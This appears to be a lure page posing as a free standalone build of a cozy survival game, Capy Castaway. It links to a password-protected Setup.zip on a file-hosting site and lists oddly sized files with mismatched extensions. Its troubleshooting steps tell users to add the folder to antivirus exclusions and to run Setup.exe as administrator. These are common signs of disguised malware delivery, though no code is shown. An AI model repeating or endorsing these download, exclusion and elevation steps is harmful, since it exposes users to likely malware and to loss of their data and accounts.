## 🎮 About the Game

Capy Castaway is a cozy survival adventure where a shipwrecked capybara explores, crafts, and rebuilds life on a mysterious tropical island. This Community Edition is a standalone build delivered as a self-contained package, ready to play immediately with no storefront required and no additional software needed. The independent release includes all content in a single offline version.

Players seeking a cozy, offline-capable survival adventure on Windows who want a ready-to-play standalone release without a storefront account.

> ℹ️ **This is a standalone community build.** No additional software, storefronts, or online activation required. Just download, extract, and play. Provided for evaluation and archival purposes.

## 📦 Package Features

- 🏝️ **Open-World Island** — Explore beaches, jungles, caves, and lagoons across a seamless tropical island.
- 🛠️ **Crafting & Building** — Gather resources to craft tools and construct a shelter from driftwood and palm.
- 🐾 **Capybara Protagonist** — Play as a calm, resourceful capybara navigating island life at your own pace.
- 🎣 **Fishing & Foraging** — Catch fish, harvest fruit, and cook meals to maintain energy and morale.
- 🌤️ **Day-Night Cycle** — Dynamic weather and a full day-night cycle shape exploration and wildlife behavior.
- 🌧️ **Survival Simulation** — Manage hunger, thirst, and shelter through storms, tides, and changing seasons.
- 🐢 **Wildlife Companions** — Befriend island animals that help uncover secrets and enable new areas.
- 🧭 **Hidden Mysteries** — Solve environmental puzzles and uncover the story of previous castaways.
- 🎮 **Controller Support** — Full gamepad support alongside keyboard and mouse controls.
- 💾 **Lightweight Footprint** — Modest hardware requirements make it accessible on older systems.
- 📦 **Self-Contained Package** — Single-folder installation with no storefront required and no additional software needed.
- 🌐 **Offline Version** — Fully playable offline with an internet connection never required after installation.
- ✅ **All Content Included** — The build includes all content from the original release in one package.
- 🌍 **Multiple Languages** — Interface and voice support across all officially localized languages.
- ☁️ **Cloud Saves Optional** — Local save system by default with manual save-file backup supported.

- **Compression:** Lossless
- **Install Time:** ~2 minutes on SSD, ~5 minutes on HDD
- **Recoding:** none
- **Selective Download:** You may skip downloading of optional voice-over packs to reduce package size.

## 📥 Installation & Setup

### Step 1: Download

Download the `Setup.zip` archive from the link below:
- **Download Link:** [https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)

### Step 2: Extract

1. The archive is protected with the password: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip, etc.)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract **all files** from the archive to a folder of your choice.
2. **IMPORTANT:** All files must be extracted to the **same folder** as `Setup.exe`.
3. The folder structure should look like this:

```
Setup/
|-- Setup.exe <- Main executable (6.3 MB)
|-- scripts.lic <- Game scripts (53.6 MB)
|-- patch_1.bnk <- Audio banks (34.5 MB)
|-- res.pak <- Resources archive (10.2 MB)
|-- animations.dll <- Animation system (4.7 MB)
|-- update_1.res <- Update resources (4.5 MB)
|-- api.pak <- API modules (4.3 MB)
|-- settings.bin <- Configuration (4.2 MB)
|-- license.wem <- Audio assets (3.8 MB)
|-- global.cfg <- Global settings (3.7 MB)
|-- assets.wem <- Asset audio (3.6 MB)
|-- physics.sys <- Physics engine (3.2 MB)
|-- dlc.md5 <- DLC checksums (3.2 MB)
|-- launcher.dll <- Launcher library (3.1 MB)
|-- driver.umap <- Driver data (2.7 MB)
|-- installer.dat <- Installer data (2.2 MB)
|-- license.bank <- License data (2.0 MB)
|-- update_1.ini <- Update config (1.9 MB)
|-- driver.pak <- Driver archive (1.6 MB)
|-- localization.ini <- Language files (1.5 MB)
|-- uninstall.key <- Uninstall key (1.1 MB)
|-- bootstrap.wem <- Bootstrap audio (0.9 MB)
|-- lang.sys <- Language system (0.8 MB)
|-- audio.res <- Audio resources (1 KB)
|-- Password 2026.txt <- Password reminder (empty)
```

### Step 4: Launch the Game

1. Navigate to the folder where you extracted all files.
2. Run `Setup.exe`.
3. The game launcher will appear.

### Step 5: Play

1. Click **"Play"** in the launcher window.
2. The game will start with the community build.
3. Enjoy the full experience!

> 💡 **Saves location:** `%LOCALAPPDATA%\CapyCastaway\Saved`

## 🐛 Troubleshooting

- **Antivirus false positive:** Add the game folder to exclusions.
- **Missing DLLs:** Install Visual C++ Redistributable 2015-2022 and latest DirectX runtime.
- **Game won't start:** Run as administrator, disable fullscreen optimizations, update GPU drivers.
